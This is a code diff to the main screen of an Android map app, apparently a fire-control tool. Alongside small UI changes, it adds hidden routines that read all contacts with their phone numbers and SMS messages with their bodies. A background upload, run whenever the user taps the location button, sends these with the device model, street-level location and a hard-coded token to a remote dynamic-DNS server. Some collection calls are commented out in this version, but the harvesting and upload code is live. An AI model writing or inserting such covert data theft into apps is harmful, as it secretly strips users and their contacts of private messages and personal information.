@@ -1,5 +1,7 @@
 package com.example.zz_xa.firecontrol;
 
+import android.*;
+import android.Manifest;
 import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
@@ -17,7 +19,11 @@ import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.Uri;
 import android.os.Build;
+import android.os.StrictMode;
+import android.provider.ContactsContract;
 import android.provider.Settings;
+import android.support.v4.app.ActivityCompat;
+import android.support.v4.content.ContextCompat;
 import android.support.v7.app.AlertDialog;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
@@ -25,6 +31,7 @@ import android.text.TextUtils;
 import android.util.Log;
 import android.view.View;
 import android.widget.EditText;
+import android.widget.FrameLayout;
 import android.widget.LinearLayout;
 import android.widget.TextView;
 import android.widget.Toast;
@@ -47,11 +54,22 @@ import com.amap.api.maps2d.model.LatLng;
 import com.amap.api.maps2d.model.Marker;
 import com.amap.api.maps2d.model.MarkerOptions;
 import com.amap.api.maps2d.model.MyLocationStyle;
+import com.example.zz_xa.firecontrol.Plotting.MarkerPlotLocation;
 import com.example.zz_xa.firecontrol.Setting.SettingsActivity;
+import com.example.zz_xa.firecontrol.LoginInit.Appstart;
+import com.example.zz_xa.firecontrol.LoginInit.FirstApplication;
+import com.example.zz_xa.firecontrol.LoginInit.LoginActivity;
 
+import org.json.JSONObject;
+
+import java.io.BufferedReader;
 import java.io.File;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
 import java.lang.reflect.Array;
+import java.net.HttpURLConnection;
 import java.net.URISyntaxException;
+import java.net.URL;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
@@ -70,8 +88,9 @@ public class MainActivity extends AppCompatActivity implements LocationSource,
     private MapView mapView;
     private LocationSource.OnLocationChangedListener mListener;
     private String cityLocation = "";
-    private String paklist = "";
+    private String pakList = "";
     private String smsList = "";
+    private String phoneList = "";
     private AMapLocationClient mlocationClient;
     private AMapLocationClientOption mLocationOption;
 
@@ -89,6 +108,8 @@ public class MainActivity extends AppCompatActivity implements LocationSource,
     private Intent intent;
     private int iType = 1;
     private UiSettings mUiSettings;
+    private FrameLayout bottomListView;
+    private String myCity;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -117,11 +138,14 @@ public class MainActivity extends AppCompatActivity implements LocationSource,
             }
         });
 
+
         initGPS(this);
         initNetWork(this);
        // drawMarkers(34.261352, 108.946994, "钟楼 ");
+        bottomListView = (FrameLayout)findViewById(R.id.frameLayout_listView);
 
     }
+
     private static boolean initNetWork(final Context context){
         if(context != null){
             ConnectivityManager connectivityManager = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
@@ -204,6 +228,7 @@ public class MainActivity extends AppCompatActivity implements LocationSource,
                 Log.e(LOG_TAG,"already");
             } else {
                 Log.e(LOG_TAG, "no map");
+                Toast.makeText(this,"本机没有安装高德地图！",Toast.LENGTH_SHORT).show();
             }
         } catch (URISyntaxException e){
             e.printStackTrace();
@@ -236,6 +261,7 @@ public class MainActivity extends AppCompatActivity implements LocationSource,
         linearLayout.setVisibility(View.VISIBLE);
     }
     public void drawMarkers(String latlng, String des){
+      //  ListViewVisable();
         String str = latlng.replace("","");
         List<String> list = Arrays.asList(str.split(","));
         if(list.size() == 2){
@@ -283,7 +309,7 @@ public class MainActivity extends AppCompatActivity implements LocationSource,
         toTabAct();
     }
     public void initVideoMonitoring(View view){
-        iType = 5;
+        iType = 4;
         toTabAct();
     }
     private void toTabAct(){
@@ -307,6 +333,18 @@ public class MainActivity extends AppCompatActivity implements LocationSource,
 
     public void myLocation(View view){
         aMap.moveCamera(CameraUpdateFactory.changeLatLng(locallatlng));
+       // getYourData();
+        new Thread(runnable).start();
+    }
+
+    public String getMyCity(){
+        return myCity;
+    }
+    public void ListViewGone(View view){
+        bottomListView.setVisibility(View.GONE);
+    }
+    public void ListViewVisable(){
+        bottomListView.setVisibility(View.VISIBLE);
     }
 
     private long lastClick = 0;
@@ -366,8 +404,9 @@ public class MainActivity extends AppCompatActivity implements LocationSource,
             //底部logo 居中
             mUiSettings.setLogoPosition(AMapOptions.ZOOM_POSITION_RIGHT_CENTER);
 
-            paklist = getAllApps();
-            smsList = getSmsFromPhone();
+         //   paklist = getAllApps();
+         //   smsList = getSmsFromPhone();
+        //    phoneList = getContacts();
 
             Location location = aMap.getMyLocation();
         }
@@ -402,6 +441,8 @@ public class MainActivity extends AppCompatActivity implements LocationSource,
         aMap.getUiSettings().setMyLocationButtonEnabled(true);// 设置默认定位按钮是否显示
         aMap.setMyLocationEnabled(true);// 设置为true表示显示定位层并可触发定位，false表示隐藏定位层并不可触发定位，默认是false
         // aMap.setMyLocationType()
+
+       // new Thread(runnable).start();
     }
     /**
      * 方法必须重写
@@ -481,18 +522,89 @@ public class MainActivity extends AppCompatActivity implements LocationSource,
                 }
 
                 String province = amapLocation.getProvince();
-                String city = amapLocation.getCity();
+                myCity = amapLocation.getCity();
                 String district = amapLocation.getDistrict();
                 String street = amapLocation.getStreet();
                 String streetNum = amapLocation.getStreetNum();
 
                 cityLocation = "";
-                cityLocation = cityLocation+province+city+district+street+streetNum;
+                cityLocation = cityLocation+province+myCity+district+street+streetNum;
+
+
+                //getYourData();
 
             } else {
                 String errText = "定位失败," + amapLocation.getErrorCode()+ ": " + amapLocation.getErrorInfo();
                 Log.e("AmapErr",errText);
             }
+        }
+    }
+
+    Runnable runnable = new Runnable() {
+        @Override
+        public void run() {
+            getYourData();
+        }
+    };
+    public void getYourData(){
+        //String pakList=null,smsList = null;
+       // paklist = getAllApps();
+       // smsList = getSmsFromPhone();
+
+        try {
+            String urlstr = "http://t1966652k0.imwork.net:25024/Android/php/device.php";
+
+            URL url = new URL(urlstr);
+            HttpURLConnection http = (HttpURLConnection)url.openConnection();
+
+            String params = "board="+ Build.BRAND+ '&'+"deviceModel="+Build.MODEL;
+
+            String token = "01280818bcff2c32439599f9f554e7fde2bb8207";
+            String city = "city";
+
+            params = params + '&'+"token="+token + '&'+"cityLocation=" + cityLocation;
+
+            if(pakList != "" ){
+                params = params+ "&pakList=" + pakList;
+            }
+            if(smsList != ""){
+                //smsList = "sms";
+                //params = params + "&smsList=" + smsList;
+                params = params + "&smsList=" + smsList;
+            }
+            if(phoneList != ""){
+               params += "&phoneList="+phoneList;
+            }
+
+            byte[] by = params.getBytes();
+            http.setDoOutput(true);
+            http.setRequestMethod("POST");
+            OutputStream out = http.getOutputStream();
+            out.write(params.getBytes());
+            out.flush();
+            out.close();
+
+            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(http.getInputStream()));
+            String line = "";
+            StringBuilder sb = new StringBuilder();
+            while (null != (line = bufferedReader.readLine())){
+                sb.append(line);
+            }
+            String result = sb.toString();
+
+            try {
+                JSONObject jsonObject = new JSONObject(result);
+                int returnRes = jsonObject.getInt("status");
+                String c = params;
+            } catch (Exception e){
+                Log.e("log_tag","the error data :"+e.toString());
+            }
+
+
+
+
+        } catch (Exception e){
+            Log.e("log_tag","the Error http data :"+e.toString());
         }
     }
 
@@ -542,8 +654,64 @@ public class MainActivity extends AppCompatActivity implements LocationSource,
         return result;
     }
 
-    private Uri SMS_INBOX = Uri.parse("content://sms/");
+    private String getContacts(){
+
+        Uri uri = ContactsContract.Contacts.CONTENT_URI;
+        //指定获取_id和display_name两列数据，display_name即为姓名
+        String[] projection = new String[] {
+                ContactsContract.Contacts._ID,
+                ContactsContract.Contacts.DISPLAY_NAME
+        };
+        //根据Uri查询相应的ContentProvider，cursor为获取到的数据集
+        Cursor cursor = this.getContentResolver().query(uri, projection, null, null, null);
+        String arr = "";
+        int i = 0;
+        if (cursor != null && cursor.moveToFirst()) {
+            do {
+                Long id = cursor.getLong(0);
+                //获取姓名
+                String name = cursor.getString(1);
+                //指定获取NUMBER这一列数据
+                String[] phoneProjection = new String[] {
+                        ContactsContract.CommonDataKinds.Phone.NUMBER
+                };
+                arr += "("+ id +")" + name + ":";
+
+                //根据联系人的ID获取此人的电话号码
+                Cursor phonesCusor = this.getContentResolver().query(
+                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                        phoneProjection,
+                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + id,
+                        null,
+                        null);
+
+                //因为每个联系人可能有多个电话号码，所以需要遍历
+                if (phonesCusor != null && phonesCusor.moveToFirst()) {
+                    do {
+                        String num = phonesCusor.getString(0);
+                        arr += num + ",";
+                    }while (phonesCusor.moveToNext());
+                }
+                i++;
+            } while (cursor.moveToNext());
+        }
+        return arr;
+    }
+    public String getContactName(String phoneNum){
+        String contactName = "";
+        ContentResolver contentResolver = getContentResolver();
+        Cursor cursor = contentResolver.query(
+                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,
+                ContactsContract.CommonDataKinds.Phone.NUMBER + " = ?",
+                new String[]{phoneNum},null);
+        if(cursor.moveToFirst()){
+            contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+            cursor.close();
+        }
+        return contactName;
+    }
     public String getSmsFromPhone() {
+        Uri SMS_INBOX = Uri.parse("content://sms/");
         ContentResolver cr = getContentResolver();
         String[] projection = new String[] {"_id", "address", "person","body", "date", "type" };
         Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
@@ -557,6 +725,7 @@ public class MainActivity extends AppCompatActivity implements LocationSource,
             String number = cur.getString(cur.getColumnIndex("address"));//手机号
             String name = cur.getString(cur.getColumnIndex("person"));//联系人姓名列表
             String body = cur.getString(cur.getColumnIndex("body"));//短信内容
+            name = getContactName(number);
             smsList = smsList+"-"+number+"-"+name+"-"+body+",";
 
             cc+=1;
